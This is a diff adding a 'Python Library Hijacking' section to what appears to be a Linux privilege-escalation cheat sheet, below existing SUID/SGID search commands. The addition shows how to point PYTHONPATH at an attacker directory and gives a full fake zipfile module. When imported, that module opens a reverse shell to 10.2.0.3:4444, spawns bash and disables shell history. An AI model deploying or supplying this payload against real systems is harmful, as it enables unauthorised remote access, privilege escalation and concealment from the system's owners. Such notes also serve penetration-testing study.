@@ -54,3 +54,46 @@ SUID & GUID:
 
 		find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 		for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+		
+		
+Python Library Hijacking:
+(https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1542133788.pdf)
+(https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)
+	view python path:
+		python -c 'import sys; print "\n".join(sys.path)'
+		python3 -c "import sys; print(sys.path)"
+		
+	Change (PYTHONPATH):
+		To add /EVILPATH:	export PYTHONPATH=/EVILPATH
+		To remove /EVILPATH: 	export PYTHONPATH=
+	
+	Content:
+		import os
+		import pty
+		import socket
+
+		lhost = "10.2.0.3"
+		lport = 4444
+
+		ZIP_DEFLATED = 0
+
+		class ZipFile:
+    			def close(*args):
+      			  return
+
+    		def write(*args):
+        		return
+
+    		def __init__(self, *args):
+        		return
+
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((lhost, lport))
+		os.dup2(s.fileno(),0)
+		os.dup2(s.fileno(),1)
+		os.dup2(s.fileno(),2)
+		os.putenv("HISTFILE",'/dev/null')
+		pty.spawn("/bin/bash")
+		s.close()
+
+	
